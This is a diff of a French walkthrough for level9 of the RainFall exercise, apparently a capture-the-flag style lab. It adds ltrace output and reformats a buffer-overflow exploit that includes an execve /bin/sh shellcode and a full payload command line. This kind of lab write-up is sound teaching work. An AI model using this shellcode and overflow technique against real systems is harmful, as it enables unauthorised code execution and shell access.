@@ -24,9 +24,14 @@ On va utiliser un shellcode qu'on va mettre dans le buffer, ensuite on overwrite
 
 adresse du debut du buffer plus 4 bytes + shellcode + padding jusqu'a 108 bytes + adresse du debut du buffer
 
-Avec ltrace on peut voir que l'adresse du buffer est 0x0804a00c.
+Avec ltrace on peut voir que l'adresse du buffer est 0x0804a00c:
+```
+level9@RainFall:~$ ltrace ./level9 aaaaaaaaaa
+...
+memcpy(0x0804a00c, "aaaaaaaaaa", 10)
+```
 
-Shellcode, execve /bin/sh (21 bytes): \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+**Notre shellcode (execve /bin/sh, 21 bytes):** \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
 
-./level9 `python -c 'print "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac\x0c\xa0\x04\x08"'`
+> ./level9 `python -c 'print "\x10\xa0\x04\x08\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac\x0c\xa0\x04\x08"'`
 
